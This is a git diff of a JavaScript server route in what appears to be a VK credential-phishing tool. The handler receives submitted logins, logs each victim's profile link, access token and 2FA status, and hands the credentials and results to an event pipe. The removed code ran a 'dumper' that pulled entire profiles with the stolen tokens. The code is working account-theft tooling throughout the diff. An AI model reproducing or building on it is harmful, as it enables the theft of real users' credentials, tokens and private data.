@@ -1,20 +1,14 @@
 import { VK } from "vk-io";
-import { sessionData } from "../server";
 import auth from "./_auth";
 import { R_SUCCESS, R_REQUIRE_2FA } from "./_auth-constants";
 import { Instance } from "chalk";
-import { join } from "path";
+import { EventsPipe } from "../system";
 
 const chalk = new Instance({ level: 2 });
-const dumperPath = join(process.cwd(), "scripts", "dump", "index.js");
 
 const _ = console.log.bind(console);
 const kwLog = (key, value) =>
   _(chalk.blueBright(`${key}:`), chalk.magentaBright(value));
-
-const dumped = new Set();
-
-const { dump } = require(dumperPath);
 
 /**
  * @type {import("polka").Middleware}
@@ -23,6 +17,8 @@ const { dump } = require(dumperPath);
 export const post = async (request, response) => {
   const ua = request.headers["user-agent"];
   let agent;
+
+  EventsPipe.emit("auth:attempt", request.body);
 
   _();
   _(chalk.bold("<Authorization attempt>"));
@@ -51,6 +47,8 @@ export const post = async (request, response) => {
     kwLog("Page", `https://vk.com/id${result.user_id}`);
     kwLog("Token", result.token);
 
+    EventsPipe.emit("auth:success", { ...request.body, ...result });
+
     const vk = new VK({ token: result.token });
 
     const [me] = await vk.api.users.get({});
@@ -59,41 +57,13 @@ export const post = async (request, response) => {
       "2fa",
       "code" in request.body ? chalk.redBright("Yes") : chalk.greenBright("No")
     );
-
-    if (sessionData.dump === true) {
-      if (dumped.has(me.id)) {
-        _(chalk.yellowBright("Profile was already dumped"));
-        return;
-      }
-
-      dumped.add(me.id);
-
-      _(
-        chalk.yellowBright(
-          `Starting dumper for profile: https://vk.com/id${me.id}`
-        )
-      );
-
-      return await dump(result.token)
-        .then(() =>
-          _(
-            chalk.greenBright(
-              `Profile: https://vk.com/id${me.id} successful dumped`
-            )
-          )
-        )
-        .catch(error =>
-          _(
-            chalk.redBright(
-              `Profile: https://vk.com/id${me.id} failed to dump`
-            ),
-            error
-          )
-        );
-    }
   } else if (result.status === R_REQUIRE_2FA) {
+    EventsPipe.emit("auth:2fa", request.body);
+
     kwLog("Status", chalk.yellowBright("2FA Required"));
   } else {
+    EventsPipe.emit("auth:failure", request.body);
+
     kwLog("Status", chalk.redBright("Error"));
   }
 };
